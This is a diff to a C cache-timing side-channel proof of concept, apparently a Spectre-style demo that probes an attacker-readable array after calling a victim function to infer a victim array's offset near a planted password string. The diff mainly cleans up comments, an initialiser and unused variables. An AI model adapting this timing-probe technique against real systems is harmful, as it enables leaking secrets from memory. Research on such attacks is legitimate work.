@@ -16,26 +16,9 @@ Victim code.
 unsigned int array1_size = 2048;
 uint64_t times[4096];
 uint8_t unused1[64];
-uint8_t array1[2048] = {
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  10,
-  11,
-  12,
-  13,
-  14,
-  15,
-  16
-};
+uint8_t array1[2048];
 uint8_t unused2[64];
-//Array4 the attacker has access to and will be used to get array1 offset
+//array4 the attacker has access to and will be used to get array1 offset
 __attribute__((aligned(4096))) char array4[4096];
 
 char* secret = "The password is rootkea" ;
@@ -75,8 +58,8 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 
 				/* Call the victim! */
 				victim_function(0);
-				
-				/* Read from the alias address of where the victim wrote to */
+
+                // Attempt to read from where the victim wrote to `array1`
 				junk = array4[i];
 			}
 			
@@ -84,7 +67,7 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 			times[i] += time2;
 		}
 
-		/* Figure out which offset took the highest access time - and add one to its score. */  
+        /* Increment the highest access time offset.*/
 		uint64_t max_time = 0;
 		for (i = 0; i < 4096; i++) {
 			if (times[i] > max_time) {
@@ -106,8 +89,6 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 				k = i;
 			}
 		}
-		//if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-		//	break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
 	value[0] ^= junk; /* use junk so code above won't get optimized out */
 	value[0] = (uint8_t)j;
@@ -124,8 +105,7 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 }
 int main(int argc,
   const char * * argv) {
-  size_t malicious_x = 0; /* default for malicious_x */
-  int i, score[2], len = 23;
+  int i, score[2];
   uint8_t value[2];
   int offset  = GetUserArrayOffset(score, value);
   printf("Victim array ptr: %p\n",(void *)(array1+200));
